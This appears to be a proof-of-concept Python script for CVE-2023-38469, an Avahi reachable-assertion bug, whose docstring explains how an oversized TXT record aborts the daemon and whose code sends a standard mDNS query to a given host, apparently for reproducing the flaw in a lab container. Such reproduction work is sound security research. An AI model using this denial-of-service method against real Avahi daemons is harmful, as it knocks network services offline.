#!/usr/bin/env python3
"""
PoC for CVE-2023-38469 - Avahi reachable assertion in
avahi_dns_packet_append_record (assert(size <= AVAHI_DNS_RDATA_MAX)).

Root cause: avahi_record_is_valid() in v0.8 only checks each TXT string
<= 255 bytes, not the total serialized rdata against the 16-bit rdlength
limit (0xFFFF). A TXT record built from >256 max-length strings passes
validation but overflows on serialization, so the assert in
avahi_dns_packet_append_record() aborts the daemon (SIGABRT) the moment it
ANNOUNCES the record on the mDNS multicast group (UDP 5353).

The vulnerable container's harness registers the oversized TXT and runs the
real AvahiServer announce loop, so it aborts deterministically on startup;
the genuine vulnerable code path is the mDNS response serializer.

This script optionally pokes the mDNS endpoint with a standard query for the
service so a patched/non-crashing daemon would have to serialize+answer it
(the same append_record path). Usage:

    python3 poc_cve_2023_38469.py [host] [port]

Then check `docker logs <container>` for:
    dns.c:806: avahi_dns_packet_append_record: Assertion
        `size <= AVAHI_DNS_RDATA_MAX' failed.
"""
import socket
import struct
import sys


def build_mdns_query(name: str, qtype: int = 12) -> bytes:
    # Standard mDNS query (QR=0). qtype 12 = PTR.
    header = struct.pack(">HHHHHH", 0x0000, 0x0000, 1, 0, 0, 0)
    q = b""
    for label in name.split("."):
        if label:
            q += bytes([len(label)]) + label.encode()
    q += b"\x00"
    q += struct.pack(">HH", qtype, 0x0001)  # QTYPE, QCLASS=IN
    return header + q


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5353

    pkt = build_mdns_query("_http._tcp.local")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2.0)
    print(f"[*] CVE-2023-38469: sending mDNS PTR query to {host}:{port} "
          f"({len(pkt)} bytes)")
    s.sendto(pkt, (host, port))
    try:
        data, addr = s.recvfrom(65535)
        print(f"[*] response {len(data)} bytes from {addr} "
              f"(daemon still up -- patched?)")
    except socket.timeout:
        print("[*] no response (daemon aborted on oversized-TXT announce, "
              "or silent). Check `docker logs` for the ASan/abort trace.")
    s.close()
    print("[*] Expected: dns.c:806 avahi_dns_packet_append_record assert -> SIGABRT")


if __name__ == "__main__":
    main()
